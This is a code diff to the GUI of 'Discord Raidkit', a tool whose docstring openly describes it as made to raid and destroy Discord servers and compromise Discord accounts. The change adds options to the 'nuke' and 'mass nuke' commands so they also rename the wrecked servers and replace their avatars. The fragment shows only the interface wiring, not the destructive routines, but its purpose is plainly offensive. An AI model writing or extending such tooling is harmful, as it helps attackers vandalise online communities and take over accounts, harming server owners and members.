@@ -1,5 +1,5 @@
 """
-Discord Raidkit v2.5.2 by the-cult-of-integral
+Discord Raidkit v2.5.3 by the-cult-of-integral
 
 An open-source, forever free tool that allows you to raid and destroy 
 Discord servers via Discord bots,  compromise Discord accounts, and 
@@ -371,7 +371,20 @@ class MainWindow(QtWidgets.QMainWindow, Ui_MainWindow):
                 excluded_member_id = int(dialog_ui.leMemberID.text().strip())
             except ValueError:
                 excluded_member_id = None
-            self.horus_thread.invoke_command(EH_HiddenCommands.NUKE.value, guild_id=guild_id, excluded_member_id=excluded_member_id)
+            
+            try:
+                new_guild_title = dialog_ui.leGuildTitle.text().strip()
+            finally:
+                if not new_guild_title:
+                    new_guild_title = None
+            
+            try:
+                avatar_path = dialog_ui.leAvatarPath.text().strip()
+            finally:
+                if not avatar_path:
+                    avatar_path = None
+
+            self.horus_thread.invoke_command(EH_HiddenCommands.NUKE.value, guild_id=guild_id, excluded_member_id=excluded_member_id, new_guild_title=new_guild_title, avatar_path=avatar_path)
 
     def horus_invoke_mass_nuke(self):
         dialog = QtWidgets.QDialog()
@@ -382,8 +395,20 @@ class MainWindow(QtWidgets.QMainWindow, Ui_MainWindow):
                 excluded_member_id = int(dialog_ui.leMemberID.text().strip())
             except ValueError:
                 excluded_member_id = None
+            
+            try:
+                new_guild_title = dialog_ui.leGuildTitle.text().strip()
+            finally:
+                if not new_guild_title:
+                    new_guild_title = None
+            
+            try:
+                avatar_path = dialog_ui.leAvatarPath.text().strip()
+            finally:
+                if not avatar_path:
+                    avatar_path = None
 
-            self.horus_thread.invoke_command(EH_HiddenCommands.MASS_NUKE.value, excluded_member_id=excluded_member_id)
+            self.horus_thread.invoke_command(EH_HiddenCommands.MASS_NUKE.value, excluded_member_id=excluded_member_id, new_guild_title=new_guild_title, avatar_path=avatar_path)
 
     def horus_invoke_leave(self):
         dialog = QtWidgets.QDialog()
